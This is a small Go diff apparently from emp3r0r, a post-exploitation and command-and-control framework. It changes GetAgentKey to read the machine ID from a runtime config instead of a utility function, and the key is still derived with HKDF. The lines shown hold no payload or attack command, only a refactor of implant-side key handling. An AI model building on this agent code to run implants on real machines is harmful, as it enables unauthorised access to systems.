@@ -7,10 +7,10 @@ import (
 	"crypto/sha256"
 	"fmt"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
-	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"golang.org/x/crypto/hkdf"
 )
 
@@ -21,7 +21,7 @@ var (
 
 // GetAgentKey derives a deterministic agent key from MachineID
 func GetAgentKey() error {
-	machineID := util.GetMachineID()
+	machineID := common.RuntimeConfig.MachineID
 	logging.Infof("Deriving agent key from MachineID: %s", machineID)
 
 	// info for HKDF
